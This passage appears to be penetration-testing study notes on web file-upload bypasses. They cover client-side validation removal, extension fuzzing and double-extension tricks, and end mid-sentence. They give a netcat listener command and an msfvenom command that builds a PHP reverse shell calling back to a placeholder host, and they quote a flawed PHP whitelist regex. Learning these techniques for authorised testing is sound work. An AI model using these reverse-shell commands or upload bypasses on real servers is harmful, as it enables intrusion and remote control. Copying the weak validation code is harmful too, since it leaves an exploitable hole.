

PHP Reverse Shell Repository : https://github.com/pentestmonkey/php-reverse-shell

> While running the above reverse shell, we need to start the Netcat Listener : `nc -lvnp OUR_PORT`

Generating Custom Reverse Shell : `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

## Client Side Validation
Use Burp Suite, on the front end, add a PNG File and then intercept this request and try to change the filename and add the payload in the body.

![[Pasted image 20250416175605.png]]

We can also remove the checkFile function present in the HTML, that would remove the Client Side Validation.

## Blacklisting Filters
**Fuzzing Extensions :**  To know what all files extensions are allowed we can simply use the BurpSuite and put a wordlist for it provided by Seclist.
![[Pasted image 20250416180959.png]]

## Whitelisting Filters
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

If a web-server is using Filters like this, then we know here it is using Regex to check for the file type and we can surely trick the server for the file type.

## Double Extensions

The code only tests whether the file name contains an image extension; a straightforward method of passing the regex test is through `Double Extensions`. For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.
![[Pasted image 20250417125619.png]]

And if the Regex Pattern is something like this : 
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
Then we need to 